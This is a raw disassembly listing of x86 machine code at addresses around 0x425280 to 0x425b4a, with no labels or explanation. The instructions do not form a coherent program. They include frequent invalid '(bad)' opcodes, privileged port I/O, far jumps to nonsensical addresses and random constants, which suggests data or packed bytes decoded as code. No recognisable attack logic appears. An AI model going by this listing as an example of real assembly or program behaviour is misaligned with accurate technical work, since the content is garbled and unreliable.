  425280:	int    0x0
  425282:	mov    edi,0xf0d3c6e0
  425287:	lock xlat BYTE PTR ds:[ebx]
  425289:	into   
  42528a:	fidivr DWORD PTR [edx-0x4320284a]
  425290:	mov    edx,0xc1cff9be
  425295:	cmc    
  425296:	in     al,dx
  425297:	(bad)  
  425298:	icebp  
  425299:	loop   0x425282
  42529b:	push   es
  42529c:	in     al,0xa
  42529e:	fisttp QWORD PTR [esi]
  4252a0:	(bad)  
  4252a2:	icebp  
  4252a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252a4:	leave  
  4252a5:	jmp    0xd6083e6a
  4252aa:	scas   eax,DWORD PTR es:[edi]
  4252ab:	clc    
  4252ac:	cmc    
  4252ad:	repz jmp 0xbcd6:0xf2d1ccc4
  4252b5:	out    0xf8,eax
  4252b7:	icebp  
  4252b8:	loopne 0x425291
  4252ba:	shr    al,0x1
  4252bd:	loopne 0x42529f
  4252bf:	retf   
  4252c0:	rol    DWORD PTR [eax],cl
  4252c2:	jmp    0x425286
  4252c4:	repz mov ebx,0xb9b5d3eb
  4252cb:	cli    
  4252cc:	shl    dl,1
  4252ce:	mov    edi,0xfcc3f8c9
  4252d3:	repnz int3 
  4252d5:	cmc    
  4252d6:	add    eax,0xd1d1e2fa
  4252db:	xbegin 0xda3217e0
  4252e1:	retf   
  4252e2:	iret   
  4252e3:	out    dx,eax
  4252e4:	out    dx,al
  4252e5:	cmc    
  4252e6:	jecxz  0x4252bc
  4252e8:	int3   
  4252e9:	stc    
  4252ea:	aad    0xdf
  4252ec:	fdiv   st,st(3)
  4252ee:	in     eax,dx
  4252ef:	fidivr WORD PTR [edi-0x7fc1017]
  4252f5:	loopne 0x4252f0
  4252f7:	add    eax,0xc7e8dc01
  4252fc:	enter  0xd9f4,0x7
  425300:	sti    
  425301:	ror    dh,0xe5
  425304:	mov    cl,0xb0
  425306:	mov    bl,0xcd
  425308:	mov    al,0xf5
  42530a:	shl    ah,cl
  42530c:	mov    edx,0xebb6f7c6
  425311:	fst    st(5)
  425313:	div    bh
  425315:	cli    
  425316:	mov    edi,0xcadae4d0
  42531b:	ret    0xfaf5
  42531e:	or     bl,ch
  425320:	fdiv   st,st(1)
  425322:	shl    bh,cl
  425324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425325:	repnz repz cmc 
  425328:	fcmovb st,st(6)
  42532a:	jmp    0xb51d0c07
  42532f:	aam    0xf2
  425331:	lock in al,dx
  425333:	repnz loope 0x425330
  425336:	jecxz  0x42530c
  425338:	loop   0x42533b
  42533a:	out    0xf8,al
  42533c:	cld    
  42533d:	add    ch,cl
  42533f:	jmp    0x425324
  425341:	call   0xf5ec2402
  425346:	out    dx,eax
  425347:	jmp    0xd6ce:0xfbfbb4c0
  42534e:	out    dx,al
  42534f:	imul   esi
  425351:	mov    edx,0xede1f0fb
  425356:	mov    esp,0xe5eadcd9
  42535b:	xlat   BYTE PTR ds:[ebx]
  42535c:	aad    0xd5
  42535e:	add    eax,0xd8cbe9c5
  425363:	mov    esp,0xecf6eadc
  425368:	in     al,0xee
  42536a:	mov    dl,0xb6
  42536c:	mov    ebx,0xd1b6d9f9
  425371:	mov    esp,0xeef1fbe2
  425376:	fadd   st,st(2)
  425378:	aad    0xfe
  42537a:	sar    ecx,0xfa
  42537d:	add    BYTE PTR [ecx+ecx*8],cl
  425380:	fcmove st,st(6)
  425382:	in     al,dx
  425383:	ret    
  425384:	loop   0x425332
  425386:	fadd   st(0),st
  425388:	in     al,dx
  425389:	mov    dl,0xed
  42538b:	(bad)
  42538f:	add    esi,esi
  425391:	sar    ch,1
  425393:	ret    0xcd00
  425396:	in     al,dx
  425397:	(bad)  
  425398:	aad    0xc5
  42539a:	lock dec dl
  42539d:	call   0xeb223685
  4253a2:	loope  0x425381
  4253a4:	shl    cl,1
  4253a6:	enter  0xd1c0,0xbb
  4253aa:	retf   0xfaf5
  4253ad:	jmp    0xc0f1:0xccf5f7e9
  4253b4:	sti    
  4253b5:	mul    bh
  4253b7:	inc    BYTE PTR [edx]
  4253b9:	icebp  
  4253ba:	cld    
  4253bb:	ret    0xe7ca
  4253be:	cld    
  4253bf:	out    0xc8,eax
  4253c1:	push   es
  4253c2:	rcr    ch,cl
  4253c4:	mov    esi,0xcaf1c2d5
  4253c9:	retf   
  4253ca:	jmp    0xfeba:0xddb5b7f6
  4253d1:	ret    0xd5f5
  4253d4:	mov    eax,0xfed8e0e6
  4253d9:	add    bl,ah
  4253db:	cli    
  4253dc:	stc    
  4253dd:	add    al,0xe3
  4253df:	aam    0x2
  4253e1:	add    eax,0xe2d0add8
  4253e6:	(bad)
  4253ea:	in     al,0xb0
  4253ec:	out    dx,eax
  4253ed:	mov    ebx,0xdebdfefa
  4253f2:	(bad)  
  4253f3:	fdivr  QWORD PTR [eax-0x1afe2bfe]
  4253f9:	stc    
  4253fa:	mov    BYTE PTR [edi],0xf9
  4253fd:	add    cl,BYTE PTR [edi]
  4253ff:	or     bl,dh
  425401:	(bad)  
  425402:	stos   BYTE PTR es:[edi],al
  425403:	out    0xb7,eax
  425405:	out    0xae,eax
  425407:	(bad)  
  425408:	jmp    0xfbb6:0xc4d9d3ac
  42540f:	std    
  425410:	enter  0xd4ef,0xda
  425414:	loop   0x4253f6
  425416:	aam    0xf4
  425418:	mov    ecx,0xefd0c9e1
  42541d:	fucom  st(6)
  42541f:	or     bl,ch
  425421:	adc    DWORD PTR [ebp-0x16163728],edi
  425427:	stos   BYTE PTR es:[edi],al
  425428:	test   eax,0xd4b8f7ac
  42542d:	neg    edx
  42542f:	into   
  425430:	leave  
  425431:	aam    0xe8
  425433:	clc    
  425434:	(bad)  
  425435:	fild   WORD PTR [edx]
  425437:	div    ebx
  425439:	loopne 0x425425
  42543b:	pop    es
  42543c:	out    0xc8,al
  42543e:	in     eax,dx
  42543f:	hlt    
  425440:	jmp    0xb0311528
  425445:	ror    esp,0xd1
  425448:	ret    
  425449:	aam    0xaf
  42544b:	(bad)  
  42544d:	mov    esi,0xc3fdfffa
  425452:	mov    ecx,0xbf02e1c3
  425457:	lock fadd DWORD PTR [edx]
  42545a:	add    al,0xc5
  42545c:	cld    
  42545d:	in     al,0xe2
  42545f:	in     eax,dx
  425460:	in     eax,dx
  425461:	int3   
  425462:	loop   0x425426
  425464:	jmp    0xf5d3:0xdbc8b5b6
  42546b:	(bad)  
  42546d:	mov    eax,0xbdd1f1e8
  425472:	xlat   BYTE PTR ds:[ebx]
  425473:	rcr    dh,1
  425475:	cli    
  425476:	cld    
  425477:	shl    dh,1
  425479:	out    0xeb,eax
  42547b:	(bad)  
  42547d:	loop   0x42547c
  42547f:	push   es
  425480:	adc    ecx,ecx
  425482:	out    dx,eax
  425483:	scas   al,BYTE PTR es:[edi]
  425484:	(bad)  
  425485:	sar    BYTE PTR [ebp-0x443a281d],0xeb
  42548c:	into   
  42548d:	repz (bad) 
  425490:	idiv   ebx
  425492:	dec    esp
  425494:	mov    eax,0xd6f7e3bd
  425499:	fild   WORD PTR [esp+ebx*8]
  42549c:	fdivp  st(6),st
  42549e:	int    0xea
  4254a0:	jmp    0xae001a78
  4254a5:	out    dx,al
  4254a6:	enter  0xd2e0,0xbb
  4254aa:	into   
  4254ab:	sti    
  4254ac:	(bad)  
  4254ad:	iret   
  4254ae:	cld    
  4254af:	into   
  4254b0:	mul    edx
  4254b2:	loope  0x425477
  4254b4:	stc    
  4254b5:	fcmovu st,st(1)
  4254b7:	push   es
  4254b8:	(bad)  
  4254ba:	loopne 0x4254bb
  4254bc:	idiv   bl
  4254be:	jecxz  0x42548e
  4254c0:	fucomip st,st(6)
  4254c2:	loopne 0x425481
  4254c4:	mov    ebp,0xb6dbd3ae
  4254c9:	fyl2xp1 
  4254cb:	mov    ebx,0xdbf0dfd6
  4254d0:	fadd   QWORD PTR [ebx]
  4254d2:	fsub   st,st(7)
  4254d4:	in     eax,dx
  4254d5:	clc    
  4254d6:	mov    edi,0xfde4c703
  4254db:	retf   
  4254dc:	inc    BYTE PTR ds:0x13e9ce09
  4254e2:	shl    bh,cl
  4254e4:	loopne 0x4254ab
  4254e6:	mov    dl,0xe5
  4254e8:	out    dx,eax
  4254e9:	in     eax,0xd8
  4254eb:	fstp   TBYTE PTR [edi-0x42140c54]
  4254f1:	in     al,dx
  4254f2:	fsub   st,st(0)
  4254f4:	rcl    bh,cl
  4254f6:	fadd   QWORD PTR [edx]
  4254f8:	les    ecx,FWORD PTR [ebx]
  4254fa:	add    esi,esp
  4254fc:	add    eax,0xcbff0efb
  425501:	shr    cl,cl
  425503:	iret   
  425504:	mov    ebp,0xf5b2b7b1
  425509:	shl    ch,cl
  42550b:	jmp    0xd33554e3
  425510:	aad    0xf5
  425512:	in     al,dx
  425513:	pop    es
  425514:	out    dx,al
  425515:	fdivrp st(7),st
  425517:	sti    
  425518:	mov    ecx,0xdfd0da
  42551d:	fld    DWORD PTR [edx]
  42551f:	add    bh,ch
  425521:	in     eax,dx
  425522:	repz ret 
  425524:	in     al,dx
  425525:	imul   eax
  425527:	ret    0xf0c7
  42552a:	neg    edx
  42552c:	mov    ah,0xf5
  42552e:	jmp    0x425518
  425530:	mov    ebx,0xd6d2fee9
  425535:	repnz loopne 0x425510
  425538:	out    0xe3,eax
  42553a:	ret    
  42553b:	fucomp st(6)
  42553d:	in     al,0xfd
  42553f:	out    dx,al
  425540:	fsub   st(6),st
  425542:	repnz enter 0xefc8,0xb1
  425547:	leave  
  425548:	loop   0x425543
  42554a:	fsubr  st,st(0)
  42554c:	mov    ecx,0xbfd1d4cd
  425551:	rcl    ebx,cl
  425553:	rcr    esp,cl
  425555:	clc    
  425556:	(bad)  
  425558:	mov    ebp,0xdce3faff
  42555d:	add    al,0xff
  42555f:	push   cs
  425560:	les    ecx,FWORD PTR [edx]
  425562:	icebp  
  425563:	repnz scas al,BYTE PTR es:[edi]
  425565:	lods   eax,DWORD PTR ds:[esi]
  425566:	imul   bh
  425568:	xlat   BYTE PTR ds:[ebx]
  425569:	(bad)  
  42556a:	aam    0xda
  42556c:	in     eax,0xb8
  42556e:	mov    ch,0xbf
  425570:	clc    
  425571:	enter  0xf0,0xbe
  425575:	add    esp,ebx
  425577:	sar    DWORD PTR [ecx+ebx*8-0x3420fa3c],1
  42557e:	cli    
  42557f:	cli    
  425580:	call   0xcd31186b
  425585:	retf   0xe6cb
  425588:	retf   
  425589:	loopne 0x42555a
  42558b:	in     al,dx
  42558c:	mov    cl,0xf2
  42558e:	(bad)  
  42558f:	(bad)  
  425591:	mov    ecx,0xfffdd6b9
  425596:	hlt    
  425597:	loop   0x425555
  425599:	std    
  42559a:	add    BYTE PTR [edx],al
  42559c:	enter  0xe4fc,0x0
  4255a0:	or     eax,eax
  4255a2:	in     eax,dx
  4255a3:	loop   0x425564
  4255a5:	retf   0xb0e7
  4255a8:	test   ecx,0xf4f8cab5
  4255ae:	fistp  QWORD PTR [eax-0x1d333d24]
  4255b4:	ret    0xe7d4
  4255b7:	in     al,dx
  4255b8:	jecxz  0x425581
  4255ba:	(bad)  
  4255bb:	jmp    0xddd:0xfce406c7
  4255c2:	ret    0xcbc5
  4255c5:	cmc    
  4255c6:	enter  0xedf0,0xd3
  4255ca:	loopne 0x42559c
  4255cc:	in     eax,0xfb
  4255ce:	mov    bl,0xff
  4255d0:	cmc    
  4255d1:	cli    
  4255d2:	fcmovnb st,st(1)
  4255d4:	int    0xde
  4255d6:	repnz mov esi,0xdcc202c3
  4255dc:	retf   
  4255dd:	or     dh,cl
  4255df:	out    dx,eax
  4255e0:	fprem  
  4255e2:	(bad)  
  4255e4:	enter  0xccf3,0xef
  4255e8:	jmp    0xf4dd:0xcdd5b5c0
  4255ef:	in     eax,dx
  4255f0:	std    
  4255f1:	repnz jecxz 0x4255b6
  4255f4:	fcmovnb st,st(6)
  4255f6:	out    0xf6,al
  4255f8:	push   es
  4255f9:	or     edx,esp
  4255fb:	rcr    ebx,0x9
  4255fe:	jecxz  0x4255e7
  425600:	pop    es
  425601:	push   es
  425602:	shl    BYTE PTR [edx-0x4a4f381c],0xc3
  425609:	in     eax,0xf5
  42560b:	les    esi,FWORD PTR [ebx+esi*8-0x3d460518]
  425612:	int    0xce
  425614:	sar    BYTE PTR [ebp-0x27231d13],cl
  42561a:	or     ebx,esp
  42561c:	or     DWORD PTR ds:0xc4de0ac4,eax
  425622:	jmp    0xb1e71af3
  425627:	mul    al
  425629:	out    0xd4,eax
  42562b:	aad    0xc7
  42562d:	mov    ecx,0xf8cdd4c5
  425632:	cld    
  425633:	mov    dh,0xcf
  425635:	stc    
  425636:	in     eax,dx
  425637:	fmul   QWORD PTR [ebx]
  425639:	(bad)  
  42563a:	add    ecx,esp
  42563c:	(bad)  
  42563d:	out    dx,al
  42563e:	clc    
  42563f:	or     eax,0xf0cacfeb
  425644:	fucomp st(7)
  425646:	shl    dh,0xd2
  425649:	in     eax,0xf7
  42564b:	sti    
  42564c:	repnz mov ebx,0xd5c8e8fd
  425652:	jmp    0xde355152
  425657:	sti    
  425658:	shl    ebp,1
  42565a:	fcmovnb st,st(0)
  42565c:	retf   0xd90a
  42565f:	add    eax,0xede70ce1
  425664:	out    dx,eax
  425665:	(bad)  
  425666:	scas   al,BYTE PTR es:[edi]
  425667:	mov    esp,0xd2b6c9e5
  42566c:	(bad)  
  42566d:	shl    ebp,1
  42566f:	(bad)  
  425671:	cli    
  425672:	mov    ebp,0xbcdff9d4
  425677:	in     al,0xea
  425679:	sti    
  42567a:	pop    es
  42567b:	add    al,0xc8
  42567d:	add    ch,ch
  42567f:	jmp    0xe3063c83
  425684:	rol    dl,0xe6
  425687:	loopne 0x42566d
  425689:	(bad)  
  42568a:	mov    al,0xc7
  42568c:	mov    ebx,0xcae4d0d8
  425691:	call   0xd11a4862
  425696:	aad    0xe1
  425698:	call   ecx
  42569a:	(bad)  
  42569c:	in     eax,0x5
  42569e:	out    dx,al
  42569f:	loopne 0x42567a
  4256a1:	add    BYTE PTR [edi-0xa36521e],ah
  4256a7:	icebp  
  4256a8:	fcmovne st,st(1)
  4256aa:	in     al,0xf8
  4256ac:	retf   0xfced
  4256af:	iret   
  4256b0:	call   0x30f276e
  4256b5:	std    
  4256b6:	add    eax,0xc7e0e602
  4256bb:	out    dx,eax
  4256bc:	idiv   ch
  4256be:	fucomp st(6)
  4256c0:	or     edx,edi
  4256c2:	stos   DWORD PTR es:[edi],eax
  4256c3:	mov    eax,0xb5f1a4d0
  4256c8:	mov    dl,0xcc
  4256ca:	(bad)  
  4256cb:	mov    edx,0xffdab4d7
  4256d0:	iret   
  4256d1:	in     eax,dx
  4256d2:	loop   0x4256b7
  4256d4:	add    ch,ch
  4256d6:	inc    edi
  4256d8:	rcl    esp,0xf5
  4256db:	mov    esi,0x9f8ef04
  4256e0:	ror    DWORD PTR [ebx],cl
  4256e2:	repz ror cl,0xf3
  4256e6:	mov    cl,0xd0
  4256e8:	iret   
  4256e9:	stc    
  4256ea:	aam    0xea
  4256ec:	test   cl,0xf6
  4256ef:	int    0xcf
  4256f1:	ret    
  4256f2:	cld    
  4256f3:	aad    0xb8
  4256f5:	mov    al,0xc4
  4256f8:	clc    
  4256f9:	out    0xe7,eax
  4256fb:	enter  0xc80b,0xe
  4256ff:	push   es
  425700:	into   
  425701:	adc    eax,esi
  425703:	test   eax,0xd2f0ecbc
  425708:	(bad)  
  425709:	mov    ebx,0xb0bfefc6
  42570e:	hlt    
  42570f:	mov    ebx,0xb6ddd0ef
  425714:	cli    
  425715:	loopne 0x42570d
  425717:	or     eax,edx
  425719:	push   es
  42571a:	cmc    
  42571b:	sar    al,1
  42571d:	loopne 0x4256fa
  42571f:	stc    
  425720:	(bad)
  425723:	test   al,0xc6
  425725:	cmc    
  425726:	mov    cl,0xe4
  425728:	leave  
  425729:	lock (bad) 
  42572b:	test   bh,0xac
  42572e:	mov    edi,0xdeced2eb
  425733:	fcmovnb st,st(7)
  425735:	ret    0xebe0
  425738:	add    al,0xb
  42573a:	xlat   BYTE PTR ds:[ebx]
  42573b:	pmulhw mm0,QWORD PTR [edx+ecx*1]
  42573f:	les    ecx,FWORD PTR [ebp*8-0x35295731]
  425746:	shl    DWORD PTR [edx-0x4a4b104e],0xde
  42574d:	std    
  42574e:	aam    0xff
  425750:	into   
  425751:	mov    esp,0xd1f7b9d2
  425756:	lock int3 
  425758:	sti    
  425759:	fadd   st(2),st
  42575b:	fcmovu st,st(7)
  42575d:	(bad)  
  42575e:	out    0xf,eax
  425760:	or     al,0xee
  425762:	fsub   st,st(3)
  425764:	test   al,0xe2
  425766:	fst    st(4)
  425768:	(bad)  
  425769:	icebp  
  42576a:	int    0xf3
  42576c:	(bad)  [ebp+esi*8-0x450a250a]
  425773:	mov    ebp,0xc3f8d5dd
  425778:	aam    0x7
  42577a:	cld    
  42577b:	or     bh,al
  42577d:	(bad)  
  42577f:	out    0xcb,eax
  425781:	adc    dl,dl
  425783:	(bad)  
  425784:	(bad)  
  425785:	in     al,0xf7
  425787:	into   
  425788:	sti    
  425789:	(bad)  
  42578a:	in     eax,0xb5
  42578c:	leave  
  42578d:	xlat   BYTE PTR ds:[ebx]
  42578e:	(bad)  
  42578f:	(bad)  
  425790:	aad    0xce
  425792:	mov    ebx,0xcdfcb8c0
  425797:	lds    ecx,FWORD PTR [edx]
  425799:	add    eax,0xe3dbefc1
  42579e:	fsubr  st(5),st
  4257a0:	or     eax,0xebd3ee02
  4257a5:	mov    al,0xb5
  4257a7:	imul   eax
  4257a9:	(bad)  
  4257aa:	in     eax,0xfb
  4257ac:	(bad)  
  4257ad:	fcomi  st,st(5)
  4257af:	add    esi,edx
  4257b1:	mov    ebp,0xd0b501b9
  4257b6:	ror    esp,cl
  4257b8:	jmp    0xf5fa:0xc4dbe8fb
  4257bf:	(bad)  
  4257c1:	int3   
  4257c2:	retf   
  4257c3:	icebp  
  4257c4:	jmp    0x425775
  4257c6:	mov    cl,0xf7
  4257c8:	out    dx,eax
  4257c9:	rol    cl,1
  4257cb:	in     eax,dx
  4257cc:	retf   
  4257cd:	ror    dl,1
  4257cf:	into   
  4257d0:	mov    ebx,0xeee0f2c3
  4257d5:	sar    dl,cl
  4257d7:	fld    QWORD PTR [edx]
  4257d9:	(bad)
  4257dc:	hlt    
  4257dd:	jmp    0x4257db
  4257df:	in     al,0xe1
  4257e1:	icebp  
  4257e2:	stos   BYTE PTR es:[edi],al
  4257e3:	shl    esi,0xd2
  4257e6:	fnsave [ebp+ecx*8-0x3b3f0a0e]
  4257ed:	into   
  4257ee:	mov    esi,0xdfc2d6d6
  4257f3:	rcr    dh,cl
  4257f5:	aad    0xf0
  4257f7:	(bad)  
  4257f9:	loope  0x4257d8
  4257fb:	in     al,0xb
  4257fd:	jmp    0xa8be:0xeeda07e8
  425804:	scas   al,BYTE PTR es:[edi]
  425805:	out    dx,al
  425806:	cmc    
  425807:	loope  0x4257d9
  425809:	repz iret 
  42580b:	fcomi  st,st(2)
  42580d:	shr    eax,cl
  42580f:	mov    ecx,0xedf8f5cc
  425814:	mov    DWORD PTR ds:0xf0c2f6fd,0xe2fcc9f7
  42581e:	out    dx,al
  42581f:	out    0xe4,eax
  425821:	or     eax,0xb1e2dfe1
  425826:	repnz int 0xd6
  425829:	retf   0xd4e6
  42582c:	clc    
  42582d:	clc    
  42582e:	int    0xca
  425830:	hlt    
  425831:	mov    eax,0xf6bff6d8
  425836:	mov    ebp,0xfa03b9bd
  42583b:	enter  0xc5f9,0xeb
  42583f:	out    0xd3,al
  425841:	fnop   
  425843:	test   eax,0xf0addde1
  425848:	out    0xfa,al
  42584a:	(bad)  
  42584b:	enter  0xf7eb,0xb8
  42584f:	rcr    esp,cl
  425851:	dec    dh
  425853:	fdivr  st,st(0)
  425855:	fild   DWORD PTR [edx]
  425857:	fcomi  st,st(6)
  425859:	mov    esp,0xded70fe7
  42585e:	fild   WORD PTR [edx]
  425860:	or     ecx,DWORD PTR [ecx]
  425862:	shr    BYTE PTR [esi-0xe1d234f],0xb7
  425869:	rol    al,0xcb
  42586c:	jmp    0x425868
  42586e:	int3   
  42586f:	in     al,0xb8
  425871:	jmp    0xdbf1:0xcefd01bc
  425878:	rol    bh,1
  42587a:	div    al
  42587c:	pop    es
  42587d:	(bad)  
  42587e:	jmp    0xba0b3c7e
  425883:	rcl    edi,1
  425885:	jmp    0xb2c4:0xf7d6e7f5
  42588c:	(bad)  
  42588e:	int    0xe9
  425890:	enter  0xf4bb,0xfe
  425894:	sar    BYTE PTR [ebx+edx*8-0x19fb29],0xfd
  42589c:	(bad)  
  42589d:	out    dx,al
  42589e:	fcom   DWORD PTR [ebx]
  4258a0:	out    dx,al
  4258a1:	or     esi,eax
  4258a3:	mov    ebp,0xd4f2c3cc
  4258a8:	(bad)  
  4258a9:	stc    
  4258aa:	(bad)  
  4258ab:	in     al,0xff
  4258ad:	mov    ch,0xf5
  4258af:	mov    ah,0xd2
  4258b1:	test   edx,0xf503d8fb
  4258b7:	xlat   BYTE PTR ds:[ebx]
  4258b8:	mov    ebp,0x6f9e0e2
  4258bd:	add    eax,0xf0f0f0e
  4258c2:	shl    DWORD PTR [edx-0x23374d3d],0xe3
  4258c9:	mov    bh,0xe5
  4258cb:	in     al,0xf3
  4258cd:	mov    ah,0xb5
  4258cf:	cli    
  4258d0:	mov    ch,0xf1
  4258d2:	out    dx,al
  4258d3:	shl    cl,cl
  4258d5:	aam    0xd6
  4258d7:	jmp    0x4258cc
  4258d9:	add    ah,bl
  4258db:	retf   0xf607
  4258de:	int    0xcf
  4258e0:	or     eax,0xadbcf006
  4258e5:	int    0xf2
  4258e7:	loope  0x4258e4
  4258e9:	out    dx,al
  4258ea:	retf   0xecf7
  4258ed:	out    dx,al
  4258ee:	cli    
  4258ef:	rcr    edx,1
  4258f1:	mov    ecx,0xd9ceffdb
  4258f6:	sar    BYTE PTR [ebp-0x293d282b],0xdd
  4258fd:	retf   
  4258fe:	cmc    
  4258ff:	out    0xfd,al
  425901:	push   cs
  425902:	jmp    0xaf0309d0
  425907:	aad    0xf2
  425909:	jmp    0xf7170efe
  42590e:	into   
  42590f:	hlt    
  425910:	mov    esp,0xd1ddfcee
  425915:	mov    edi,0xdcfef9f4
  42591a:	pop    es
  42591b:	loop   0x4258f6
  42591d:	mov    BYTE PTR [ebx],0xf8
  425920:	loopne 0x4258ef
  425922:	enter  0xcef3,0xe1
  425926:	mov    al,0xc8
  425928:	fcmovnbe st,st(0)
  42592a:	sti    
  42592b:	rcl    dl,cl
  42592d:	(bad)
  425930:	icebp  
  425931:	shl    bl,cl
  425933:	loop   0x42590d
  425935:	in     al,dx
  425936:	jecxz  0x425916
  425938:	add    cl,bl
  42593a:	ret    
  42593b:	sti    
  42593c:	enter  0xefcb,0xb
  425940:	(bad)  
  425941:	in     eax,dx
  425942:	scas   eax,DWORD PTR es:[edi]
  425943:	lods   al,BYTE PTR ds:[esi]
  425944:	out    0xad,al
  425946:	iret   
  425947:	call   0xb82f3c38
  42594c:	aad    0xc5
  42594e:	(bad)  
  42594f:	iret   
  425950:	hlt    
  425951:	(bad)  
  425953:	fadd   st,st(1)
  425955:	out    0xc7,eax
  425957:	neg    ah
  425959:	add    edi,edi
  42595b:	loop   0x425921
  42595d:	add    esi,eax
  42595f:	or     eax,0xc7d8e0e2
  425964:	loopne 0x42595d
  425966:	int3   
  425967:	div    ch
  425969:	(bad)  
  42596a:	cmc    
  42596b:	rcl    ch,0xf4
  42596e:	cld    
  42596f:	shr    esp,cl
  425971:	icebp  
  425972:	fsqrt  
  425974:	(bad)  [esp+edi*8-0x3c1e3a2f]
  42597b:	std    
  42597c:	lds    eax,FWORD PTR [ebx]
  42597e:	iret   
  42597f:	stc    
  425980:	(bad)  
  425982:	shl    dh,0xbe
  425985:	mov    bh,0xcc
  425988:	(bad)  
  425989:	lock (bad) 
  42598b:	into   
  42598c:	test   ebx,0xf9c9eae9
  425992:	hlt    
  425993:	(bad)  
  425994:	cli    
  425995:	int    0xfd
  425997:	shl    edx,cl
  425999:	rcl    edi,1
  42599b:	out    0xf,eax
  42599d:	push   es
  42599e:	int    0xfc
  4259a0:	leave  
  4259a1:	retf   
  4259a2:	iret   
  4259a3:	mov    bl,0xd1
  4259a5:	jmp    0xb50f4b76
  4259aa:	sar    DWORD PTR [ebx-0xf302626],cl
  4259b0:	(bad)  
  4259b2:	repnz test DWORD PTR [esi],0xfaffc1df
  4259b9:	loop   0x4259bc
  4259bb:	add    al,0xc8
  4259bd:	jmp    0xd0ea:0xdada07f8
  4259c4:	rcr    esp,0xf0
  4259c7:	(bad)  
  4259c8:	int3   
  4259c9:	ror    ecx,cl
  4259cb:	fcmovnb st,st(6)
  4259cd:	div    ebp
  4259cf:	push   eax
  4259d1:	hlt    
  4259d2:	mov    ecx,0xf3fbb803
  4259d7:	sar    BYTE PTR [ecx-0x5372727],cl
  4259dd:	fucomip st,st(7)
  4259df:	iret   
  4259e0:	iret   
  4259e1:	shr    BYTE PTR [ebx-0x371b3a31],0xc1
  4259e8:	xlat   BYTE PTR ds:[ebx]
  4259e9:	fidiv  DWORD PTR [edx-0x2d330a3a]
  4259ef:	stc    
  4259f0:	(bad)  
  4259f2:	rcr    ecx,0xe0
  4259f5:	jecxz  0x4259cc
  4259f7:	mov    edx,0xe3de01c7
  4259fc:	call   0xe00861e6
  425a01:	shl    bh,0xdd
  425a04:	jecxz  0x4259f6
  425a06:	call   0xc92a31fa
  425a0b:	icebp  
  425a0c:	fsubr  st,st(5)
  425a0e:	aam    0xe4
  425a10:	fmulp  st(7),st
  425a12:	fdivr  DWORD PTR [esp+esi*8+0xe7c5c2]
  425a19:	mov    eax,0xd50fe5dd
  425a1e:	add    edi,esi
  425a20:	repnz in al,dx
  425a22:	les    ebp,FWORD PTR [esi-0x2d3b3649]
  425a28:	aam    0xd2
  425a2a:	jmp    0xf6d4:0xf2d0cdce
  425a31:	fcmovnu st,st(3)
  425a33:	int3   
  425a34:	add    ebx,ebx
  425a36:	ret    0xfeff
  425a39:	out    0xc6,eax
  425a3b:	out    0xd8,eax
  425a3d:	in     al,0xd
  425a3f:	fisttp QWORD PTR [ecx]
  425a41:	int3   
  425a42:	out    0xb8,eax
  425a44:	jecxz  0x425a2a
  425a46:	mov    dl,0xd5
  425a48:	test   eax,0xf1fbfbf5
  425a4d:	idiv   eax
  425a4f:	fcmovne st,st(4)
  425a51:	std    
  425a52:	(bad)  
  425a54:	loopne 0x425a23
  425a56:	out    0xba,al
  425a58:	push   es
  425a59:	loopne 0x425a64
  425a5b:	test   BYTE PTR [edi+ecx*8],0xc8
  425a5f:	out    0x12,al
  425a61:	retf   
  425a62:	int3   
  425a63:	int    0xb7
  425a65:	iret   
  425a66:	lds    ebp,FWORD PTR [esi+esi*4-0x46464a50]
  425a6d:	in     al,dx
  425a6e:	out    dx,al
  425a6f:	mov    dh,0xfa
  425a71:	call   0xdc212e64
  425a76:	(bad)
  425a79:	fdiv   st,st(0)
  425a7b:	mul    ch
  425a7d:	out    0xca,al
  425a7f:	call   0xb41b2589
  425a84:	ret    0xeebd
  425a87:	out    dx,al
  425a88:	mov    cl,0xf1
  425a8a:	retf   
  425a8b:	mov    dl,0xdb
  425a8d:	retf   0xf8b8
  425a90:	int    0xce
  425a92:	xlat   BYTE PTR ds:[ebx]
  425a93:	rol    bh,1
  425a95:	add    bh,bl
  425a97:	(bad)
  425a9a:	pop    es
  425a9b:	test   ebx,0xedc9cfe5
  425aa1:	jmp    0xa8ef478f
  425aa6:	fucom  st(5)
  425aa8:	shl    edi,1
  425aaa:	(bad)  
  425aab:	(bad)  
  425aac:	jmp    0xde0d438c
  425ab1:	fdiv   st,st(0)
  425ab3:	cmc    
  425ab4:	add    bh,dh
  425ab6:	fcomp  st(2)
  425ab8:	mov    ecx,0xd408d1d4
  425abd:	dec    edi
  425abf:	in     al,dx
  425ac0:	fld    DWORD PTR [ebx]
  425ac2:	stos   BYTE PTR es:[edi],al
  425ac3:	retf   0xcbd7
  425ac6:	rol    ah,0xf4
  425ac9:	out    0xc7,al
  425acb:	shr    esi,cl
  425acd:	sti    
  425ace:	mov    ebx,0xc1fdbcea
  425ad3:	jecxz  0x425ac7
  425ad5:	add    eax,0xe3dbd5f2
  425ada:	or     cl,ah
  425adc:	iret   
  425add:	(bad)  
  425ade:	leave  
  425adf:	jmp    0xb0e9:0xafccea09
  425ae6:	retf   
  425ae7:	jmp    0x425ad3
  425ae9:	out    0xe8,eax
  425aeb:	in     al,0xd7
  425aed:	idiv   ecx
  425aef:	stc    
  425af0:	call   0x42b1ec3
  425af5:	in     eax,dx
  425af6:	(bad)  
  425af7:	fstp   st(5)
  425af9:	mov    eax,0xf6e8c108
  425afe:	add    cl,BYTE PTR [edi+ebx*8]
  425b01:	retf   
  425b02:	rol    ebp,0xc5
  425b05:	iret   
  425b06:	mov    dl,0xe5
  425b08:	ror    al,cl
  425b0a:	retf   0xb6c7
  425b0d:	out    dx,eax
  425b0e:	(bad)
  425b11:	repz fsin 
  425b14:	(bad)  
  425b16:	add    edx,eax
  425b18:	add    eax,eax
  425b1a:	leave  
  425b1b:	enter  0xdff7,0xea
  425b1f:	jmp    0xd7f035e5
  425b24:	test   al,0xce
  425b26:	retf   
  425b27:	sti    
  425b28:	loope  0x425afe
  425b2a:	aad    0xba
  425b2c:	retf   0xb3b6
  425b2f:	mov    ebp,0xddd6c2df
  425b34:	mov    edi,0xd7eb01f5
  425b39:	rol    BYTE PTR [esi],cl
  425b3b:	fcomp  st(5)
  425b3d:	or     esi,esp
  425b3f:	(bad)
  425b43:	rcl    edx,cl
  425b45:	shl    al,cl
  425b47:	iret   
  425b48:	int    0xd6
  425b4a:	ror    dl,1
